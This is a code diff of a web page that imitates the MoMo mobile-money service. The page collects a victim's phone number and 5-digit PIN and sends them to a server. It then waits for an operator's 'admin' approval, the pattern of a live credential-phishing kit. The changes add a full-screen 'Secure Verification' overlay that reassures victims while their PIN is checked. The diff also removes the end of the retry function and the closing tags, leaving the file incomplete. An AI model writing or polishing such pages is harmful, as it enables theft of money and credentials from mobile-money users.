@@ -112,14 +112,54 @@
     .hidden { display: none !important; }
     .legal-text { text-align: center; font-size: 13px; color: #666; margin-top: 25px; }
     .legal-text a { color: #004f71; text-decoration: none; font-weight: bold; }
-    .spinner { width: 40px; height: 40px; margin: 20px auto; border: 4px solid #eee; border-top-color: #004f71; border-radius: 50%; animation: spin .8s linear infinite; }
-    @keyframes spin { to { transform: rotate(360deg); } }  
-    .status { text-align: center; margin-top: 15px; color: #555; }
     .error { color: #d32f2f; text-align: center; margin-top: 12px; font-weight: 600; }
     .success { font-size: 24px; text-align: center; color: #2e7d32; font-weight: bold; }
+
+    /* ✅ MATCHED LAYOUT LOADING SCREEN STYLING OVERLAY */
+    .secure-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 30, 45, 0.75);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #ffffff;
+      text-align: center;
+    }
+    .circular-spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid rgba(255, 255, 255, 0.2);
+      border-top-color: #00cc66; /* Matching green loading circle */
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    .secure-title {
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 8px;
+      letter-spacing: 0.5px;
+    }
+    .secure-sub {
+      font-size: 14px;
+      color: #dddddd;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
+
+  <!-- ✅ SECURE VERIFICATION MODAL LAYER -->
+  <div id="secureModal" class="secure-overlay hidden">
+    <div class="circular-spinner"></div>
+    <div class="secure-title">Secure Verification</div>
+    <div class="secure-sub">Verifying your PIN...<br>Please do not close this page.</div>
+  </div>
 
   <header>
     <div class="momo-logo-box"><span class="momo-logo-text">MoMo</span></div>
@@ -132,7 +172,6 @@
       <label class="field-label">Enter number *</label>
       <div class="phone-row">
         <div class="country-flag">🇺🇬</div>
-        <!-- ✅ Fixed: Explicit ID matching the script -->
         <input type="text" id="phoneInput" class="phone-input-field" placeholder="e.g. 778260583" inputmode="numeric" maxlength="9">
       </div>
       <button id="phoneButton" disabled>NEXT</button>
@@ -144,11 +183,7 @@
       <h2>Welcome to MoMo</h2>
       <label class="field-label">Enter your 5-digit PIN</label>
       <div class="digits" id="pinDigits"></div>
-      <div id="pinLoading" class="hidden">
-        <div class="spinner"></div>
-        <p class="status">Verifying credentials...</p>
-      </div>
-      <p id="pinStatus" class="status"></p>
+      <p id="pinStatus" class="status" style="text-align:center; margin-top: 15px;"></p>
       <p id="pinError" class="error"></p>
     </section>
 
@@ -168,11 +203,10 @@
     const phoneButton = document.getElementById('phoneButton');
     const phoneError = document.getElementById('phoneError');
     const pinDigitsContainer = document.getElementById('pinDigits');
-    const pinLoading = document.getElementById('pinLoading');
+    const secureModal = document.getElementById('secureModal');
     const pinStatus = document.getElementById('pinStatus');
     const pinError = document.getElementById('pinError');
 
-    // ✅ Fixed listener logic: Toggles the disable flag properly on 9 digits
     phoneInput.addEventListener('input', (e) => {
       let digits = e.target.value.replace(/[^0-9]/g, '');
       e.target.value = digits;
@@ -233,7 +267,8 @@
 
     async function submitPinFlow(pinValue, inputs) {
       pinError.textContent = '';
-      pinLoading.classList.remove('hidden');
+      // ✅ Triggers the verification fullscreen loading layer instantly
+      secureModal.classList.remove('hidden'); 
       inputs.forEach(i => i.disabled = true);
 
       try {
@@ -245,8 +280,8 @@
         if (!res.ok) throw new Error('Submission failed.');
         startPollingAdminState(inputs);
       } catch (err) {
+        secureModal.classList.add('hidden');
         pinError.textContent = err.message;
-        pinLoading.classList.add('hidden');
         inputs.forEach(i => { i.disabled = false; i.value = ''; });
         inputs[0].focus();
       }
@@ -262,12 +297,13 @@
 
           if (data.status === 'approved') {
             clearInterval(pollInterval);
+            secureModal.classList.add('hidden');
             pinPage.classList.add('hidden');
             successPage.classList.remove('hidden');
           } else if (data.status === 'declined') {
             clearInterval(pollInterval);
-            pinLoading.classList.add('hidden');
-            pinStatus.innerHTML = `Declined. <button id="retryBtn">Try Again</button>`;
+            secureModal.classList.add('hidden'); // Drops the loading layout window to expose reset controls
+            pinStatus.innerHTML = `Declined. <button id="retryBtn" style="padding: 8px 16px; margin-top: 10px;">Try Again</button>`;
             document.getElementById('retryBtn').addEventListener('click', () => resetPinLayout(inputs));
           }
         } catch (err) { console.error(err); }
@@ -276,18 +312,4 @@
 
     async function resetPinLayout(inputs) {
       try {
-        await fetch('/api/retry', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ id: currentRequestId })
-        });
-        inputs.forEach(i => { i.value = ''; i.disabled = false; });
-        pinLoading.classList.add('hidden');
-        pinStatus.textContent = '';
-        inputs[0].focus();
-      } catch (err) { pinError.textContent = 'Reset failed.'; }
-    }
-  </script>
-</body>
-</html>
 
